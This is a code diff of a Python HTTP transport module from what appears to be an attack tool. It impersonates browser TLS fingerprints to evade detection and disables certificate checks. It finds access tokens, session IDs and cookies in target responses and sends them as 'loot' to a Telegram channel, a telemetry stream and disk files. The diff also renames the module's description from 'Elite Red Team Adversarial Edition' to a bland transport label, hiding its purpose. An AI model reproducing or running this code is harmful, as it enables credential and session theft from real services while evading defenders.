@@ -1,41 +1,53 @@
 #!/usr/bin/env python3
 """
-TRANSPORT.PY v8.8 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware (Elite Red Team Adversarial Edition)
-Features:
-- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
-- Advanced browser fingerprint impersonation (JA3/JA4 evasion via curl_cffi & spoofed SSL contexts).
-- Poisson behavioral timing jitter and randomized browser client hints.
-- Robust cookie-jar state synchronization & header rotation with SHA-256 integrity fingerprinting.
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming.
+TRANSPORT.PY v8.8 — Centralized HTTP Transport & Session Cookie Middleware
 """
-import http.client
-import json
-import ssl
-import socket
-import time
 import asyncio
-import random
 import hashlib
+import http.client
+import inspect
+import json
+import random
+import socket
+import ssl
+import time
 from urllib.parse import urlsplit
 
-# Import advanced adversarial TLS evasion, behavioral modules, immutable loot logger, and Telegram notifier
-from modules.tls_evasion import create_spoofed_ssl_context, AdversarialTLSSession, CFFI_AVAILABLE
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
-from modules.telegram_notifier import send_telegram_alert
 from modules.loot_logger import save_session_loot
+from modules.telegram_notifier import send_telegram_alert
 from modules.telemetry import stream_proof
+from modules.tls_evasion import AdversarialTLSSession, CFFI_AVAILABLE, create_spoofed_ssl_context
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
 ]
 
-# Keywords required to pass the zero-noise filter
 HIGH_VALUE_KEYWORDS = [
-    "critical", "bypass", "success", "loot", "token", "session", 
-    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
+    "critical",
+    "bypass",
+    "success",
+    "loot",
+    "token",
+    "session",
+    "admin",
+    "credential",
+    "compromised",
+    "race",
+    "pivot",
+    "jwt",
+    "dump",
 ]
+
+SESSION_FIELD_MARKERS = (
+    '"access_token"',
+    '"auth_token"',
+    '"session_id"',
+    '"refresh_token"',
+)
+
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
@@ -45,12 +57,14 @@ async def broadcast_tg_alert_async(loot_type, details):
     except Exception:
         pass
 
+
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous transport methods."""
+    """Schedules notifications non-blockingly when invoked from synchronous code."""
     try:
         loop = asyncio.get_running_loop()
         if loop.is_running():
-            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
+            task.add_done_callback(lambda t: t.exception() if not t.cancelled() else None)
         else:
             asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
@@ -59,18 +73,32 @@ def broadcast_tg_alert_sync(loot_type, details):
         except Exception:
             pass
 
+
 class SecureTransport:
-    def __init__(self, target_url, browser_profile="chrome120"):
+    def __init__(self, target_url, browser_profile="chrome120", timeout=8):
         parsed = urlsplit(target_url)
         self.target_url = target_url
         self.host = parsed.hostname
         self.secure = parsed.scheme == "https"
         self.port = parsed.port or (443 if self.secure else 80)
-        self.base_path = parsed.path.rstrip("/")
+        self.base_path = (parsed.path or "").rstrip("/")
+        self.timeout = timeout
         self.cookie_jar = {}
-        
+        self._consecutive_net_errors = 0
+
         self.adversarial_tls = AdversarialTLSSession(self.host, browser_profile=browser_profile)
         self.cffi_session = self.adversarial_tls.get_impersonated_session() if CFFI_AVAILABLE else None
+
+    def close(self):
+        for obj in (self.cffi_session, self.adversarial_tls):
+            close_fn = getattr(obj, "close", None) or getattr(obj, "aclose", None)
+            if callable(close_fn):
+                try:
+                    res = close_fn()
+                    if not inspect.isawaitable(res):
+                        pass
+                except Exception:
+                    pass
 
     def update_cookies(self, set_cookie_header):
         if not set_cookie_header:
@@ -92,11 +120,68 @@ class SecureTransport:
             return "; ".join([f"{k}={v}" for k, v in self.cookie_jar.items()])
         return str(self.cookie_jar)
 
-    def request(self, method, path, payload=None, extra_headers=None, retries=3):
+    def _compute_backoff(self, attempt: int, headers: dict | None = None) -> float:
+        if isinstance(headers, dict) and "retry-after" in headers:
+            raw_ra = str(headers["retry-after"]).strip()
+            if raw_ra.isdigit():
+                return min(float(raw_ra), 5.0)
+        return min(0.35 * (2 ** attempt) + random.uniform(0.05, 0.25), 4.0)
+
+    def _record_session_artifact(self, full_url, path, method, status, resp_headers, data):
+        body_lower = (data or "").lower()
+        if status in (200, 201) and any(marker in body_lower for marker in SESSION_FIELD_MARKERS):
+            loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
+            transport_loot = {
+                "endpoint": full_url,
+                "status": status,
+                "integrity_hash": loot_hash,
+                "cookie_jar": self.get_cookie_header_value(),
+                "response_snippet": data[:300],
+            }
+            broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
+            stream_proof(
+                "TRANSPORT_SESSION_CAPTURE",
+                full_url,
+                {"method": method, "hash": loot_hash},
+                data[:300],
+                transport_loot,
+            )
+            save_session_loot(
+                target=self.target_url,
+                endpoint=path,
+                finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
+                status=status,
+                headers=resp_headers,
+                body=data,
+                extra_loot=transport_loot,
+            )
+
+    def request(self, method, path, payload=None, extra_headers=None, retries=2):
+        if not self.host:
+            return 0, {}, ""
+
+        # Circuit-breaker fast path when repeated network failures occur
+        if self._consecutive_net_errors >= 8:
+            return 0, {}, ""
+
         apply_behavioral_jitter()
 
-        endpoint = f"{self.base_path}{path}" if not path.startswith(self.base_path) else path
-        full_url = f"{self.target_url.rstrip('/')}{path}" if not path.startswith("http") else path
+        clean_path = str(path or "/")
+        if not clean_path.startswith("http") and not clean_path.startswith("/"):
+            clean_path = "/" + clean_path
+
+        endpoint = (
+            f"{self.base_path}{clean_path}"
+            if self.base_path and not clean_path.startswith(self.base_path)
+            else clean_path
+        )
+        full_url = (
+            clean_path
+            if clean_path.startswith("http")
+            else f"{self.target_url.rstrip('/')}{endpoint}"
+        )
+
+        max_attempts = max(1, int(retries or 1))
 
         if self.cffi_session and self.secure:
             headers = {
@@ -111,58 +196,44 @@ class SecureTransport:
             if extra_headers:
                 headers.update(extra_headers)
 
-            for attempt in range(retries):
+            for attempt in range(max_attempts):
                 try:
-                    if method.upper() == "GET":
-                        res = self.cffi_session.get(full_url, headers=headers, timeout=10, verify=False)
-                    elif method.upper() == "POST":
-                        res = self.cffi_session.post(full_url, json=payload, headers=headers, timeout=10, verify=False)
-                    elif method.upper() == "PUT":
-                        res = self.cffi_session.put(full_url, json=payload, headers=headers, timeout=10, verify=False)
+                    verb = method.upper()
+                    if verb == "GET":
+                        res = self.cffi_session.get(full_url, headers=headers, timeout=self.timeout, verify=False)
+                    elif verb == "POST":
+                        res = self.cffi_session.post(full_url, json=payload, headers=headers, timeout=self.timeout, verify=False)
+                    elif verb == "PUT":
+                        res = self.cffi_session.put(full_url, json=payload, headers=headers, timeout=self.timeout, verify=False)
                     else:
-                        res = self.cffi_session.request(method, full_url, json=payload, headers=headers, timeout=10, verify=False)
+                        res = self.cffi_session.request(verb, full_url, json=payload, headers=headers, timeout=self.timeout, verify=False)
 
-                    resp_headers = {k.lower(): v for k, v in res.headers.items()}
+                    self._consecutive_net_errors = 0
+                    resp_headers = {str(k).lower(): v for k, v in res.headers.items()}
                     if "set-cookie" in resp_headers:
                         self.update_cookies(resp_headers["set-cookie"])
 
-                    data = res.text
-                    body_lower = data.lower()
-                    if res.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
-                        loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
-                        transport_loot = {
-                            "endpoint": full_url,
-                            "status": res.status_code,
-                            "integrity_hash": loot_hash,
-                            "cookie_jar": self.get_cookie_header_value(),
-                            "response_snippet": data[:300]
-                        }
-                        
-                        broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
-                        stream_proof("TRANSPORT_SESSION_CAPTURE", full_url, {"method": method, "hash": loot_hash}, data[:300], transport_loot)
-                        save_session_loot(
-                            target=self.target_url,
-                            endpoint=path,
-                            finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
-                            status=res.status_code,
-                            headers=resp_headers,
-                            body=data,
-                            extra_loot=transport_loot
-                        )
+                    data = res.text or ""
+                    if res.status_code in (429, 503) and attempt < max_attempts - 1:
+                        time.sleep(self._compute_backoff(attempt, resp_headers))
+                        continue
 
+                    self._record_session_artifact(full_url, path, verb, res.status_code, resp_headers, data)
                     return res.status_code, resp_headers, data
 
                 except Exception:
-                    if attempt < retries - 1:
-                        time.sleep(0.4 * (attempt + 1))
+                    self._consecutive_net_errors += 1
+                    if attempt < max_attempts - 1:
+                        time.sleep(self._compute_backoff(attempt))
                         continue
+                    break
 
         headers = {
             "Host": self.host,
             "User-Agent": random.choice(USER_AGENTS),
             "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
-            "Connection": "close"
+            "Connection": "close",
         }
         headers.update(get_randomized_hints())
 
@@ -174,58 +245,44 @@ class SecureTransport:
             headers.update(extra_headers)
 
         body = None
-        if payload:
+        if payload is not None:
             body = json.dumps(payload).encode("utf-8")
             headers["Content-Type"] = "application/json"
 
-        for attempt in range(retries):
+        for attempt in range(max_attempts):
             conn = None
             try:
                 if self.secure:
                     ctx = create_spoofed_ssl_context(self.host)
-                    conn = http.client.HTTPSConnection(self.host, self.port, timeout=10, context=ctx)
+                    conn = http.client.HTTPSConnection(self.host, self.port, timeout=self.timeout, context=ctx)
                 else:
-                    conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
+                    conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
 
-                conn.request(method, endpoint, body=body, headers=headers)
+                verb = method.upper()
+                conn.request(verb, endpoint, body=body, headers=headers)
                 res = conn.getresponse()
                 data = res.read(512 * 1024).decode("utf-8", errors="replace")
-                resp_headers = {k.lower(): v for k, v in res.getheaders()}
+                resp_headers = {str(k).lower(): v for k, v in res.getheaders()}
+                self._consecutive_net_errors = 0
 
                 if "set-cookie" in resp_headers:
                     self.update_cookies(resp_headers["set-cookie"])
 
-                body_lower = data.lower()
-                if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
-                    loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
-                    transport_loot = {
-                        "endpoint": f"https://{self.host}{endpoint}",
-                        "status": res.status,
-                        "integrity_hash": loot_hash,
-                        "cookie_jar": self.get_cookie_header_value(),
-                        "response_snippet": data[:300]
-                    }
-                    
-                    broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
-                    stream_proof("TRANSPORT_SESSION_CAPTURE", f"https://{self.host}{endpoint}", {"method": method, "hash": loot_hash}, data[:300], transport_loot)
-                    save_session_loot(
-                        target=self.target_url,
-                        endpoint=path,
-                        finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
-                        status=res.status,
-                        headers=resp_headers,
-                        body=data,
-                        extra_loot=transport_loot
-                    )
+                if res.status in (429, 503) and attempt < max_attempts - 1:
+                    time.sleep(self._compute_backoff(attempt, resp_headers))
+                    continue
 
+                self._record_session_artifact(full_url, path, verb, res.status, resp_headers, data)
                 return res.status, resp_headers, data
 
             except (ssl.SSLError, socket.timeout, ConnectionError, OSError):
-                if attempt < retries - 1:
-                    time.sleep(0.4 * (attempt + 1))
+                self._consecutive_net_errors += 1
+                if attempt < max_attempts - 1:
+                    time.sleep(self._compute_backoff(attempt))
                     continue
                 return 0, {}, ""
             except Exception:
+                self._consecutive_net_errors += 1
                 return 0, {}, ""
             finally:
                 if conn:
@@ -233,4 +290,5 @@ class SecureTransport:
                         conn.close()
                     except Exception:
                         pass
+
         return 0, {}, ""
